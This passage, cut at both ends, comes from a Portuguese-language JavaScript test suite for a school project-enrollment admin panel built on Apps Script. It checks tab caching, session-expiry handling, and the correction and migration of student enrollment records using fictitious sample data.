  amb.api.inserir('agregados', { ADS: '2', ADM: '2' }, 'cursos');
  amb.zerar();

  const r = chamar(amb, 'listarAlunos', { pagina: 1, tamanho: 50, cursos: false });
  igual(r.ok, true);
  igual(r.cursos, undefined, 'mandou a lista que a tela já tinha');
  igual(leiturasDePonto(amb.falso).length, 0, 'leu o documento de agregados sem precisar');
  igual(amb.falso.requisicoes.length, 2, '1 agregação do total + 1 consulta da página');
});

teste('o padrão continua sendo mandar — quem não conhece o parâmetro não perde nada', () => {
  const amb = ambiente();
  semear(amb.api);
  amb.api.inserir('agregados', { ADS: '2', ADM: '2' }, 'cursos');

  igual(chamar(amb, 'listarAlunos').cursos, ['ADM', 'ADS']);
  igual(chamar(amb, 'listarAlunos', { cursos: true }).cursos, ['ADM', 'ADS']);
});

// ------------------------------------------------ O cliente também conta

/**
 * O maior ganho não foi no servidor: era o `Admin.html` chamando o servidor a
 * cada troca de aba, inclusive ao voltar para uma aba que acabara de ser vista.
 * Cada volta era uma execução nova do Apps Script para redesenhar a MESMA tela.
 *
 * O que estes testes conferem é o contrato do lado do navegador. Eles leem o
 * arquivo, e não o executam — o que eles NÃO provam é o comportamento no
 * navegador de verdade, que só o clique encontra.
 */
grupo('a memória de aba do Admin.html');

teste('trocar para uma aba já carregada não chama o servidor', () => {
  verdadeiro(/if\s*\(ABAS_PRONTAS\[nome\]\)\s*return;/.test(ADMIN),
    'a saída antecipada de `trocarAba` sumiu — toda troca voltou a custar uma execução');
});

teste('cada aba de leitura marca que carregou', () => {
  ['painel', 'projetos', 'alunos', 'lotes', 'log', 'config'].forEach((aba) => {
    verdadeiro(ADMIN.indexOf('ABAS_PRONTAS.' + aba + ' = true') !== -1,
      'a aba ' + aba + ' nunca é marcada como pronta: ela recarrega sempre, ou nunca');
  });
});

teste('toda aba que parou de recarregar sozinha ganhou um botão Atualizar', () => {
  // Sem isto a memória de aba vira dado velho preso na tela: o professor não
  // teria como pedir o número novo sem recarregar a página inteira.
  [['painel', 'carregarPainel(true)'], ['projetos', 'carregarProjetos()'],
    ['lotes', 'carregarLotes()'], ['log', 'carregarLog()'],
    ['config', 'carregarConfig()']].forEach(([aba, chamada]) => {
    verdadeiro(ADMIN.indexOf('onclick="' + chamada + '">Atualizar<') !== -1,
      'a aba ' + aba + ' não tem botão Atualizar chamando ' + chamada);
  });

  // Alunos é a exceção declarada: o Filtrar já recarrega com os filtros da barra.
  verdadeiro(ADMIN.indexOf('onclick="carregarAlunos(1)">Filtrar<') !== -1);
});

teste('gravar faz o painel esquecer o que as abas guardaram', () => {
  verdadeiro(/if\s*\(!SO_LEITURA\[funcao\]\)\s*\{[\s\S]{0,200}esquecerAbas\(\);/.test(ADMIN),
    'o esquecimento automático sumiu de `chamar` — a tela pode mostrar o valor de antes de gravar');
  verdadeiro(/PAINEL_DESATUALIZADO\s*=\s*true;/.test(ADMIN),
    'sem a bandeira, importar e depois abrir o Painel mostraria a contagem velha');
});

teste('SO_LEITURA só tem leitura, e toda função dela existe no servidor', () => {
  // A lista é de LEITURAS de propósito: esquecer de declarar uma função nova
  // custa uma recarga a mais (correta), enquanto numa lista de ESCRITAS o mesmo
  // esquecimento deixaria a tela mentindo depois de a coordenação gravar.
  const bloco = /var SO_LEITURA = \{([\s\S]*?)\};/.exec(ADMIN);
  verdadeiro(bloco !== null, 'SO_LEITURA sumiu do Admin.html');

  const nomes = bloco[1].match(/[A-Za-z_$][\w$]*(?=\s*:)/g) || [];
  // `listarAdmins` entrou em 07/08, com a tela de "Quem tem acesso": ela abre
  // junto com a aba Configurações, e fora desta lista TODA abertura daquela aba
  // faria o painel esquecer o que as outras sete carregaram — uma recarga
  // completa a cada visita, por uma chamada que só lê.
  // `modoDeAcesso` entrou em 11/08 junto com a nova tentativa do envelope: por
  // estar fora desta lista, a PRIMEIRA chamada do painel não era repetida, e um
  // soluço de rede no carregamento virava "não consegui falar com o servidor".
  // `inscricoesRecentes` e `filaDeEspera` entraram em 11/08 com a aba Auditório
  // (13_Auditorio.gs). As duas só consultam — nenhuma escreve, nem no log —,
  // então repeti-las depois de um soluço de rede devolve a mesma lista. As três
  // vizinhas delas no mesmo arquivo (`anularInscricoes`, `restaurarInscricoes`,
  // `promoverDaEspera`) GRAVAM, e por isso ficam de fora: repetir qualquer uma
  // delas depois de uma resposta perdida é refazer o estrago.
  // `inscritosDoProjeto` (10_Painel.gs) e `matriculadosDaDisciplina`
  // (12_Disciplinas.gs) entraram em 12/08 com os relatórios de inscritos. As duas
  // são leitura pura — consultam e cruzam, não gravam nem no log — e são as que
  // mais precisam da retentativa: a segunda lê DUAS coleções, é a mais lenta do
  // painel, e perder a resposta por um soluço de rede faria a coordenação clicar
  // de novo e pagar a conta inteira duas vezes.
  igual(nomes.sort(), ['detalheAluno', 'filaDeEspera', 'inscricoesRecentes',
    'inscritosDaDisciplina', 'inscritosDoProjeto', 'lerConfiguracoes',
    'listarAdmins', 'listarAlunos', 'listarDisciplinas', 'listarLog', 'listarLotes',
    'matriculadosDaDisciplina', 'modoDeAcesso', 'painelEstatisticas', 'painelProjetos',
    'sessaoAtiva'],
  'entrou (ou saiu) função da lista de leituras — confira se ela realmente não grava');

  // `listarBanners` PARECE leitura e não é: ela passa por `drivePasta_`, que cria
  // a pasta de banners quando a propriedade PASTA_BANNERS_ID ainda não existe.
  // Repetida depois de uma falha de rede, criaria pasta duplicada.
  igual(nomes.indexOf('listarBanners'), -1,
    'listarBanners cria a pasta no Drive na primeira chamada — não é repetível');

  // `exportarCsv` grava uma linha na trilha de auditoria: se entrasse aqui, a aba
  // Histórico deixaria de mostrar a exportação que acabou de acontecer.
  igual(nomes.indexOf('exportarCsv'), -1, 'exportarCsv registra no log — ela não é só leitura');

  const amb = ambiente();
  nomes.forEach((n) => igual(typeof amb.api[n], 'function', n + ' não existe no servidor'));
});

teste('o select de curso é esquecido junto — curso novo não fica fora do filtro', () => {
  verdadeiro(/function esquecerAbas\(\)[\s\S]{0,400}removeAttribute\('data-carregado'\)/.test(ADMIN),
    'o `select` guardaria a lista de cursos de antes da reconciliação');
  verdadeiro(/f\.cursos =[\s\S]{0,80}getElementById\('filtro-curso'\)\.getAttribute\('data-carregado'\)/.test(ADMIN),
    'o cliente parou de dizer ao servidor se já tem a lista de cursos');
});

teste('o Painel pede atualização quando o professor pede, ou quando gravou', () => {
  verdadeiro(/chamar\('painelEstatisticas',\s*\{\s*atualizar:\s*Boolean\(forcar\)\s*\|\|\s*PAINEL_DESATUALIZADO\s*\}/.test(ADMIN),
    'o carregamento do Painel deixou de furar o cache depois de uma gravação');
});

grupo('a abertura do painel deixou de ser duas esperas em fila');

teste('a conferência do token e o primeiro carregamento saem juntos', () => {
  // Esperar `sessaoAtiva` responder para só então pedir os números empilhava
  // duas execuções do Apps Script (~1,5 s de custo fixo cada) antes de a
  // primeira tela aparecer — e a segunda reconfere o mesmo token de qualquer
  // jeito, porque toda função do painel começa por `exigirAdmin`.
  // O bloco saiu de dentro do `DOMContentLoaded` e virou `entrarComSessao`, que
  // hoje tem dois chamadores: a sessão guardada nesta aba e o `?sessao=` que
  // `liberarAcesso()` imprime. A ordem que este teste protege é a mesma, e agora
  // vale para os dois de uma vez.
  const boot = /function entrarComSessao\(token, guardar\)\s*\{([\s\S]*?)\n\s{2}\}/.exec(ADMIN);
  verdadeiro(boot !== null, 'o bloco de abertura do painel mudou de forma');

  const antesDoSessaoAtiva = boot[1].indexOf('abrirPainel()');
  const sessaoAtiva = boot[1].indexOf("chamar('sessaoAtiva'");
  verdadeiro(antesDoSessaoAtiva !== -1 && sessaoAtiva !== -1);
  verdadeiro(antesDoSessaoAtiva < sessaoAtiva,
    'o painel voltou a esperar a conferência do token para só então carregar');
});

teste('token morto ainda devolve uma tela de login utilizável', () => {
  // O risco do boot otimista mora aqui: a tela de login pode nunca ter sido
  // desenhada, e sem `prepararLogin` o professor cairia numa tela que só diz
  // "Verificando a forma de acesso...", sem campo nenhum para preencher.
  const sair = /function sairDoPainel\(\)\s*\{([\s\S]*?)\n\s{2}\}/.exec(ADMIN);
  verdadeiro(sair !== null, 'sairDoPainel mudou de forma');
  verdadeiro(/if\s*\(!MODO\)\s*prepararLogin\(\);/.test(sair[1]),
    'sem esta linha, sessão guardada e vencida deixa o professor num login mudo');
});

teste('sessão vencida derruba o painel UMA vez, não duas', () => {
  // Com o boot em fila havia um caminho só para a recusa. Em paralelo há DOIS, e
  // com a sessão guardada já vencida os dois recusam: `sessaoAtiva` (que só lê
  // uma propriedade do script) quase sempre responde antes de `painelEstatisticas`
  // (11 idas ao Firestore), desliga a sessão e desenha o login; a recusa da
  // segunda chegava depois e refazia tudo.
  //
  // Medido executando o JavaScript do Admin.html contra o servidor, com as duas
  // respostas na ordem provável: `sair`, `modoDeAcesso` e `autenticar` rodavam
  // DUAS vezes numa única abertura — duas execuções a mais no caminho mais lento
  // que existe, duas sessões criadas e duas linhas de LOGIN na auditoria para uma
  // pessoa só; e a segunda passagem ainda limpava o campo de PIN embaixo do dedo
  // de quem já estivesse digitando. As duas saídas precisam do mesmo porteiro:
  // quem já está do lado de fora não sai de novo.
  const recusa = /if \(r\.ok === false && \/Sess\.o expirada\|inv\.lida\/i\.test\(r\.erro \|\| ''\)\) \{\s*([^\n]*)/
    .exec(ADMIN);
  verdadeiro(recusa !== null, 'o tratamento de sessão expirada em chamar() mudou de forma');
  verdadeiro(/if \(TOKEN\) sairDoPainel\(\);/.test(recusa[1]),
    'a recusa que chega em segundo lugar precisa parar em TOKEN, senão desliga a sessão duas vezes');

  // O outro caminho já nascia guardado; os dois têm de continuar assim.
  verdadeiro(/if \(TOKEN && \(!r \|\| !r\.ok\)\) \{ gravarToken\(null\); sairDoPainel\(\); \}/.test(ADMIN),
    'o retorno de sessaoAtiva perdeu a mesma guarda');
});

// ==================================================== A ficha do aluno: editar
//
// Daqui para baixo os cenários são montados com o CÓDIGO DE VERDADE das outras
// fases — `gravarInscricao` grava a inscrição, `reconciliar` produz `alunos`.
// Semear `alunos` na mão provaria que este arquivo escreve o que ele mesmo
// escreveu; o que precisa ser provado é outra coisa: que a ficha corrigida cai no
// endereço que a reconciliação usaria, e que a rodada seguinte concorda com ela.

function semearProjeto(api, id, nome, vagas, extra) {
  api.inserir('projetos', Object.assign({
    codigo: id, nome: nome, descricao: '', professor: '', email_professor: '',
    banner: '', local: '', horario: '', primeiro_encontro: '',
    vagas: String(vagas), ativo: 'SIM', inscricoes_abertas: 'SIM',
    validar_matricula: 'SIM', ordem: '1', atualizado_em: ''
  }, extra || {}), id);
}

function semearMatriculado(api, matricula, nome, curso, turma) {
  api.inserir('matriculados', {
    matricula: matricula, nome: nome, cpf: '', email: '', telefone: '',
    data_nascimento: '', curso: curso, turma: turma, situacao: 'MATRICULADO',
    lote_id: 'l1', importado_em: '2026-08-01 09:00:00'
  }, matricula);
}

function inscrever(api, projetoId, projetoNome, dados) {
  return api.gravarInscricao(Object.assign({
    origem: 'SITE', projeto_id: projetoId, projeto_nome: projetoNome,
    declara_ciencia: true, consentimento_lgpd: 'SIM'
  }, dados));
}

/**
 * O caso do Jonathan: a aluna Ana digitou a matrícula do Bruno.
 *
 * O estrago não é só "o número está errado". A cascata casa a inscrição da Ana com
 * o MATRICULADO do Bruno (degrau 0, matrícula), a ficha resultante fica com o nome
 * e a turma do Bruno, e o Bruno — que nem se inscreveu — SOME do cadastro, porque
 * o registro dele foi consumido (`usados`, 06_Reconciliacao.gs).
 */
function cenarioMatriculaTrocada() {
  const amb = ambiente();
  const api = amb.api;

  semearProjeto(api, 'p1', 'R+ Cidades', 60);
  semearMatriculado(api, '9110700', 'Bruno Costa', 'ADM', 'ADM61');
  semearMatriculado(api, '9110701', 'Ana Lima', 'ADS', 'ADS21');

  amb.inscricao = inscrever(api, 'p1', 'R+ Cidades', {
    matricula: '9110700', nome: 'Ana Lima', email: 'ana@exemplo.com',
    curso_fase: 'ADS - ADS21', matricula_conferida: 'SIM'
  });

  api.reconciliar();

  amb.idDoBruno = api.chaveAluno_('mat:9110700');
  amb.idDaAna = api.chaveAluno_('mat:9110701');
  return amb;
}

grupo('editarAluno — a matrícula de outra pessoa, que é o pior caso do arquivo');

teste('antes da correção, a ficha da inscrição mostra o nome de OUTRA pessoa', () => {
  const amb = cenarioMatriculaTrocada();

  const errada = amb.api.ler('alunos', amb.idDoBruno);
  igual(errada.nome, 'Bruno Costa', 'a lista oficial manda no nome — é o que montarAluno_ faz');
  igual(errada.turma, 'ADM61');
  igual(errada.status, 'DIVERGENCIA');
  igual(errada.inscricao_id, amb.inscricao.id);

  // E o Bruno de verdade não tem ficha própria: o registro dele foi consumido.
  igual(amb.api.ler('alunos', amb.idDaAna).status, 'SO_MATRICULADO');
  igual(amb.api.contar('alunos'), 2);
});

teste('corrigir a matrícula move a inscrição de endereço e não deixa a velha para trás', () => {
  const amb = cenarioMatriculaTrocada();

  const r = chamar(amb, 'editarAluno', { id: amb.idDoBruno, matricula: '9110701' });
  igual(r.ok, true, r.erro);

  igual(amb.api.ler('inscricoes', amb.inscricao.id), null, 'a inscrição no endereço velho sobrou');
  igual(amb.api.contar('inscricoes'), 1, 'a correção duplicou a inscrição');

  const nova = amb.api.listar('inscricoes', {}).itens[0];
  igual(nova.matricula, '9110701');
  igual(nova.nome, 'Ana Lima', 'o nome digitado não podia ter sido tocado');
  igual(nova._id, amb.api.chaveDedup_({ projeto_id: 'p1', matricula: '9110701' }),
    'o id da inscrição É a chave de dedup: ele tem de ser o que chaveDedup_ calcula');
});

teste('a ficha corrigida cai no endereço que a reconciliação usaria, e o dono da matrícula antiga volta', () => {
  const amb = cenarioMatriculaTrocada();

  const r = chamar(amb, 'editarAluno', { id: amb.idDoBruno, matricula: '9110701' });
  igual(r.id, amb.idDaAna, 'a ficha precisa mudar para o endereço da chave nova');
  igual(r.reconciliou, true, 'sem a rodada, status, curso e turma ficariam os da outra pessoa');

  const ana = amb.api.ler('alunos', amb.idDaAna);
  igual(ana.nome, 'Ana Lima');
  igual(ana.matricula, '9110701');
  igual(ana.turma, 'ADS21');
  igual(ana.status, 'CONFIRMADO');

  // O endereço velho não vira lixo: ele É o `chaveAluno_` da matrícula do Bruno,
  // e a mesma rodada o reaproveita para devolver o Bruno ao cadastro.
  const bruno = amb.api.ler('alunos', amb.idDoBruno);
  igual(bruno.nome, 'Bruno Costa');
  igual(bruno.status, 'SO_MATRICULADO');
  igual(amb.api.contar('alunos'), 2, 'ninguém foi duplicado nem perdido');

  // E a trilha aponta para a ficha CERTA: o endereço velho virou a ficha do
  // Bruno, então registrar a correção nele deixaria o histórico dizendo que
  // alguém mexeu na matrícula do Bruno.
  const trilha = chamar(amb, 'listarLog').itens.filter((l) => l.acao === 'ALUNO_EDITADO')[0];
  igual(trilha.entidade_id, amb.idDaAna);
  verdadeiro(/matrícula 9110700 -> 9110701/.test(trilha.detalhe), trilha.detalhe);
});

teste('a correção reconfere a matrícula contra a lista oficial', () => {
  const amb = cenarioMatriculaTrocada();

  chamar(amb, 'editarAluno', { id: amb.idDoBruno, matricula: '90909090' });
  const nova = amb.api.listar('inscricoes', {}).itens[0];
  igual(nova.matricula_conferida, 'NAO',
    'sem reconferir, a inscrição ficaria com o visto verde que ganhou pela matrícula de outro');

  // E o visto chega até a ficha, que é onde o selo ✓ da lista de alunos lê.
  igual(amb.api.ler('alunos', amb.api.chaveAluno_('mat:90909090')).matricula_conferida, 'NAO');
});

teste('a mesma pessoa no mesmo projeto é recusada pelo BANCO, antes de qualquer exclusão', () => {
  const amb = cenarioMatriculaTrocada();
  const api = amb.api;

  // A Ana também tem uma inscrição legítima, com a matrícula certa.
  const legitima = inscrever(api, 'p1', 'R+ Cidades', {
    matricula: '9110701', nome: 'Ana Lima', email: 'ana@exemplo.com', curso_fase: 'ADS - ADS21'
  });
  api.reconciliar();
  amb.zerar();

  const r = chamar(amb, 'editarAluno', { id: amb.idDoBruno, matricula: '9110701' });
  igual(r.ok, false);
  verdadeiro(/já existe uma inscrição desta pessoa neste projeto/.test(r.erro), r.erro);

  verdadeiro(amb.api.ler('inscricoes', amb.inscricao.id) !== null, 'a recusa apagou a inscrição velha');
  verdadeiro(amb.api.ler('inscricoes', legitima.id) !== null, 'a recusa mexeu na inscrição que já existia');
  igual(amb.api.contar('inscricoes'), 2);

  // A garantia é do banco: a criação no endereço novo é uma requisição só, e é
  // ela que volta 409. Não existe consulta de duplicidade antes da escrita.
  igual(consultas(amb.falso).length, 0, 'apareceu uma consulta de duplicidade — a garantia mudou de dono');
});

teste('matrícula em branco é recusada: ela é a chave, não um campo qualquer', () => {
  const amb = cenarioMatriculaTrocada();
  const r = chamar(amb, 'editarAluno', { id: amb.idDoBruno, matricula: '   ' });
  igual(r.ok, false);
  verdadeiro(/não pode ficar em branco/.test(r.erro), r.erro);
});

teste('matrícula fora do formato não chega a custar leitura nenhuma', () => {
  const amb = cenarioMatriculaTrocada();
  amb.zerar();

  const r = chamar(amb, 'editarAluno', { id: amb.idDoBruno, matricula: '12' });
  igual(r.ok, false);
  verdadeiro(/Matrícula inválida/.test(r.erro), r.erro);
  igual(amb.falso.requisicoes.length, 0, 'conferência de formato depois de ler o banco');
});

teste('inscrição SEM matrícula: mudar o NOME também move o documento', () => {
  // `chaveDedup_` cai para e-mail + nome quando não há matrícula nem CPF. Quem
  // decidisse mover olhando "o campo matrícula mudou?" acertaria o caso comum e
  // deixaria esta inscrição num endereço que não é mais o dela — e a próxima
  // gravação da mesma pessoa entraria como se fosse outra.
  const amb = ambiente();
  const api = amb.api;
  semearProjeto(api, 'p1', 'R+ Cidades', 60);

  const velha = inscrever(api, 'p1', 'R+ Cidades', {
    nome: 'Ana Lima', email: 'ana@exemplo.com', curso_fase: 'ADS - ADS21'
  });
  api.reconciliar();

  const id = api.chaveAluno_('pes:ana@exemplo.com|' + api.chaveNome('Ana Lima'));
  verdadeiro(api.ler('alunos', id) !== null, 'o cenário não montou a ficha sem matrícula');

  const r = chamar(amb, 'editarAluno', { id: id, nome: 'Ana Lima Souza' });
  igual(r.ok, true, r.erro);
  igual(api.ler('inscricoes', velha.id), null, 'a inscrição ficou no endereço da chave velha');
  igual(api.contar('inscricoes'), 1);
  igual(r.reconciliou, true, 'a chave da pessoa mudou: a ficha precisa mudar de endereço também');
});

teste('aluno que veio só da lista oficial não tem matrícula editável — e a recusa diz por quê', () => {
  const amb = cenarioMatriculaTrocada();

  const r = chamar(amb, 'editarAluno', { id: amb.idDaAna, matricula: '77777777' });
  igual(r.ok, false);
  verdadeiro(/não tem inscrição/.test(r.erro), r.erro);
});

// ------------------------------------------------------------ Nome e turma

grupo('editarAluno — nome e turma vão para a fonte, e sobrevivem à rodada seguinte');

teste('a turma é gravada na lista oficial, e a reconciliação a mantém', () => {
  const amb = cenarioMatriculaTrocada();

  const r = chamar(amb, 'editarAluno', { id: amb.idDoBruno, turma: 'ADM62' });
  igual(r.ok, true, r.erro);
  igual(r.reconciliou, false, 'mudar turma não precisa de cruzamento');

  igual(amb.api.ler('matriculados', '9110700').turma, 'ADM62', 'a turma não foi para a fonte');
  igual(amb.api.ler('alunos', amb.idDoBruno).turma, 'ADM62', 'a tela mostraria a turma velha');

  // A prova de que a correção DURA: a rodada seguinte recalcula a ficha do zero.
  amb.api.reconciliar();
  igual(amb.api.ler('alunos', amb.idDoBruno).turma, 'ADM62',
    'a correção sumiu no cruzamento — foi gravada no lugar errado');
});

teste('a turma de quem não está na lista oficial é recusada, em vez de aceita e esquecida', () => {
  const amb = ambiente();
  semearProjeto(amb.api, 'p1', 'R+ Cidades', 60);
  inscrever(amb.api, 'p1', 'R+ Cidades', {
    matricula: '5550001', nome: 'Carla Dias', email: 'carla@exemplo.com', curso_fase: 'ADS - ADS11'
  });
  amb.api.reconciliar();

  const id = amb.api.chaveAluno_('mat:5550001');
  igual(amb.api.ler('alunos', id).status, 'SO_INSCRITO');

  const r = chamar(amb, 'editarAluno', { id: id, turma: 'ADS11' });
  igual(r.ok, false);
  verdadeiro(/vem da lista oficial/.test(r.erro), r.erro);
});

teste('corrigir o nome DIGITADO não muda a linha do cadastro de quem casou com a secretaria', () => {
  const amb = cenarioMatriculaTrocada();

  const r = chamar(amb, 'editarAluno', { id: amb.idDoBruno, nome: 'ana lima de souza' });
  igual(r.ok, true, r.erro);

  igual(amb.api.ler('inscricoes', amb.inscricao.id).nome, 'Ana Lima de Souza',
    'o nome digitado é gravado na inscrição, com a mesma formatação do formulário');

  // `montarAluno_` faz `mat.nome || insc.nome`: a lista oficial manda. Gravar o
  // nome digitado na ficha aqui seria escrever algo que a rodada das 5h desfaria.
  igual(amb.api.ler('alunos', amb.idDoBruno).nome, 'Bruno Costa');

  amb.api.reconciliar();
  igual(amb.api.ler('alunos', amb.idDoBruno).nome, 'Bruno Costa', 'a projeção e a rodada discordaram');
});

teste('corrigir o nome OFICIAL muda a linha do cadastro, porque é ele que manda', () => {
  const amb = cenarioMatriculaTrocada();

  const r = chamar(amb, 'editarAluno', { id: amb.idDoBruno, nome_oficial: 'Bruno Costa Filho' });
  igual(r.ok, true, r.erro);
  igual(amb.api.ler('matriculados', '9110700').nome, 'Bruno Costa Filho');
  igual(amb.api.ler('alunos', amb.idDoBruno).nome, 'Bruno Costa Filho');

  verdadeiro(r.avisos.join(' ').indexOf('importação') !== -1,
    'quem corrige a lista da secretaria precisa saber que a próxima importação sobrescreve');
});

teste('a projeção usa a MESMA precedência de montarAluno_ — campo a campo', () => {
  const amb = cenarioMatriculaTrocada();
  chamar(amb, 'editarAluno', { id: amb.idDoBruno, nome_oficial: 'Bruno Costa Filho', turma: 'ADM62' });

  const projetado = amb.api.ler('alunos', amb.idDoBruno);
  const inscricao = amb.api.ler('inscricoes', amb.inscricao.id);
  const matriculado = amb.api.ler('matriculados', '9110700');

  // O que a reconciliação produziria com os MESMOS documentos. Se as duas
  // divergirem, a tela mostra um valor agora e outro depois da madrugada.
  const daRodada = amb.api.montarAluno_(inscricao, matriculado, 'Matrícula', 1, 'CONFIRMADO');
  ['nome', 'turma', 'curso', 'matricula'].forEach((campo) => {
    igual(projetado[campo], daRodada[campo], 'a projeção divergiu de montarAluno_ em ' + campo);
  });
});

teste('salvar sem mudar nada não escreve nada', () => {
  const amb = cenarioMatriculaTrocada();
  amb.zerar();

  const r = chamar(amb, 'editarAluno', {
    id: amb.idDoBruno, matricula: '9110700', nome: 'Ana Lima',
    nome_oficial: 'Bruno Costa', turma: 'ADM61', projeto_id: 'p1'
  });
  igual(r.ok, true);
  igual(escritas(amb.falso).length, 0, 'um Salvar distraído gravou — inclusive uma linha de log');
});

// ------------------------------------------------------------ Migração

grupo('editarAluno — migrar de projeto: a vaga conta, o teto não bloqueia, o contador não mente');

/** Um projeto de 2 vagas já CHEIO, e uma aluna inscrita em outro. */
function cenarioMigracao() {
  const amb = ambiente();
  const api = amb.api;

  semearProjeto(api, 'p1', 'R+ Cidades', 60);
  semearProjeto(api, 'p2', 'Robótica', 2);

  inscrever(api, 'p2', 'Robótica', { matricula: '1001', nome: 'Um Aluno', email: 'um@exemplo.com' });
  inscrever(api, 'p2', 'Robótica', { matricula: '1002', nome: 'Dois Aluno', email: 'dois@exemplo.com' });

  amb.inscricao = inscrever(api, 'p1', 'R+ Cidades', {
    matricula: '9110701', nome: 'Ana Lima', email: 'ana@exemplo.com', curso_fase: 'ADS - ADS21'
  });

  api.reconciliar();
  amb.idDaAna = api.chaveAluno_('mat:9110701');
  return amb;
}

teste('o projeto de destino já estava esgotado — e a migração passa mesmo assim', () => {
  const amb = cenarioMigracao();
  igual(amb.api.listarProjetos(false).filter((p) => p.id === 'p2')[0].situacao, 'ESGOTADO');

  const r = chamar(amb, 'editarAluno', { id: amb.idDaAna, projeto_id: 'p2' });
  igual(r.ok, true, r.erro);
  verdadeiro(/3 de 2 vagas/.test(r.mensagem), 'a frase precisa dizer o número verdadeiro: ' + r.mensagem);
});

teste('a vaga conta de verdade: a agregação do destino sobe, sem contador gravado', () => {
  const amb = cenarioMigracao();
  igual(amb.api.contarInscritos_('p2'), 2);
  igual(amb.api.contarInscritos_('p1'), 1);

  chamar(amb, 'editarAluno', { id: amb.idDaAna, projeto_id: 'p2' });

  igual(amb.api.contarInscritos_('p2'), 3, 'a inscrição não mudou de projeto de verdade');
  igual(amb.api.contarInscritos_('p1'), 0, 'a inscrição ficou nos dois projetos ao mesmo tempo');
});

teste('o contador mostra 3 de 2, e não 2 de 2', () => {
  const amb = cenarioMigracao();
  chamar(amb, 'editarAluno', { id: amb.idDaAna, projeto_id: 'p2' });

  const p2 = chamar(amb, 'painelProjetos').itens.filter((p) => p.id === 'p2')[0];
  igual(p2.inscritos, 3, 'o painel arredondou a ocupação para o teto');
  igual(p2.vagas, 2);
  igual(p2.restantes, 0, '"faltam -1 vagas" não é frase — o que não pode é o inscritos mentir');
  igual(p2.situacao, 'ESGOTADO');
});

teste('o formulário do aluno continua barrando: a exceção é da coordenação, não do público', () => {
  const amb = cenarioMigracao();
  chamar(amb, 'editarAluno', { id: amb.idDaAna, projeto_id: 'p2' });

  // O caminho público passa pelo lock (09_Projetos.gs), e o sandbox de apoio.js
  // não tem LockService — é o mesmo mínimo que testes/api.js injeta.
  amb.api.LockService = { getScriptLock: () => ({ waitLock() {}, releaseLock() {} }) };

  const r = amb.api.submeterInscricao({
    projeto_id: 'p2', matricula: '1003', nome: 'Tres Aluno', email: 'tres@exemplo.com',
    curso_fase: 'ADS - ADS11', declara_ciencia: true, consentimento_lgpd: 'SIM', origem: 'SITE'
  });
  igual(r.ok, false);
  igual(r.situacao, 'ESGOTADO');
  igual(amb.api.contarInscritos_('p2'), 3, 'o público entrou num projeto acima do teto');
});

teste('a migração vai para o histórico com de onde saiu, para onde foi e quanto ficou', () => {
  const amb = cenarioMigracao();
  chamar(amb, 'editarAluno', { id: amb.idDaAna, projeto_id: 'p2' });

  const linha = chamar(amb, 'listarLog').itens.filter((l) => l.acao === 'ALUNO_MIGRADO')[0];
  verdadeiro(linha, 'a migração não deixou trilha');
  igual(linha.usuario, 'coordenacao@exemplo.com');
  verdadeiro(linha.detalhe.indexOf('R+ Cidades') !== -1, linha.detalhe);
  verdadeiro(linha.detalhe.indexOf('Robótica') !== -1, linha.detalhe);
  verdadeiro(linha.detalhe.indexOf('ACIMA DO TETO') !== -1,
    'é esta linha que responde "por que este projeto tem mais inscritos que vagas": ' + linha.detalhe);
});

teste('migrar não dispara o cruzamento — a chave da pessoa não mudou', () => {
  const amb = cenarioMigracao();
  amb.zerar();

  const r = chamar(amb, 'editarAluno', { id: amb.idDaAna, projeto_id: 'p2' });
  igual(r.reconciliou, false);
  verdadeiro(amb.falso.requisicoes.length < 15,
    'uma migração custou ' + amb.falso.requisicoes.length + ' requisições — o cruzamento entrou junto?');

  const ficha = amb.api.ler('alunos', amb.idDaAna);
  igual(ficha.projeto, 'Robótica', 'a ficha continuaria mostrando o projeto de onde ele saiu');
  igual(ficha.inscricao_id, amb.api.chaveDedup_({ projeto_id: 'p2', matricula: '9110701' }),
    'a ficha aponta para uma inscrição que mudou de endereço — o detalhe abriria vazio');
});

teste('quem está em dois projetos migra um e mantém o outro', () => {
  const amb = cenarioMigracao();
  const api = amb.api;

  inscrever(api, 'p2', 'Robótica', {
    matricula: '9110701', nome: 'Ana Lima', email: 'ana@exemplo.com', curso_fase: 'ADS - ADS21'
  });
  semearProjeto(api, 'p3', 'Horta', 30);
  api.reconciliar();

  const antes = api.ler('alunos', amb.idDaAna).projeto.split(' | ');
  igual(antes.length, 2, 'o cenário não montou o aluno em dois projetos');

  const saiuDe = api.ler('inscricoes', api.ler('alunos', amb.idDaAna).inscricao_id).projeto_nome;
  chamar(amb, 'editarAluno', { id: amb.idDaAna, projeto_id: 'p3' });

  const depois = api.ler('alunos', amb.idDaAna).projeto.split(' | ');
  igual(depois.length, 2);
  verdadeiro(depois.indexOf('Horta') !== -1, 'o projeto novo não entrou: ' + depois.join(' | '));
  igual(depois.indexOf(saiuDe), -1, 'o projeto de onde ele saiu continuou na ficha: ' + depois.join(' | '));
});

teste('migrar para projeto inexistente é recusado', () => {
  const amb = cenarioMigracao();
  const r = chamar(amb, 'editarAluno', { id: amb.idDaAna, projeto_id: 'nao-existe' });
  igual(r.ok, false);
  verdadeiro(/Projeto de destino não encontrado/.test(r.erro), r.erro);
});

teste('migrar a mesma pessoa para onde ela já está é recusado pelo banco', () => {
  const amb = cenarioMigracao();
  const api = amb.api;

  inscrever(api, 'p2', 'Robótica', {
    matricula: '9110701', nome: 'Ana Lima', email: 'ana@exemplo.com', curso_fase: 'ADS - ADS21'
  });
  api.reconciliar();

  // Qual das duas inscrições a ficha aponta é decidido por `porChegada_`, e as
  // duas nasceram no mesmo segundo — o desempate é pelo id, que é um hash. Então
  // o destino da migração é lido do dado, e não escrito à mão: fixar 'p2' aqui
  // faria o teste passar ou falhar por sorteio.
  const atual = api.ler('inscricoes', api.ler('alunos', amb.idDaAna).inscricao_id).projeto_id;
  const destino = atual === 'p1' ? 'p2' : 'p1';

  const r = chamar(amb, 'editarAluno', { id: amb.idDaAna, projeto_id: destino });
  igual(r.ok, false);
  verdadeiro(/já está em "/.test(r.erro), r.erro);
  igual(api.contar('inscricoes'), 4, 'a recusa apagou ou duplicou alguma inscrição');
});

// ================================================ Atualizar, e o freio do custo

grupo('atualizarAlunos — cruzar antes de listar, com freio');

function cenarioAtualizar() {
  const amb = ambiente();
  semearProjeto(amb.api, 'p1', 'R+ Cidades', 60);
  semearMatriculado(amb.api, '9110701', 'Ana Lima', 'ADS', 'ADS21');
  inscrever(amb.api, 'p1', 'R+ Cidades', {
    matricula: '9110701', nome: 'Ana Lima', email: 'ana@exemplo.com', curso_fase: 'ADS - ADS21'
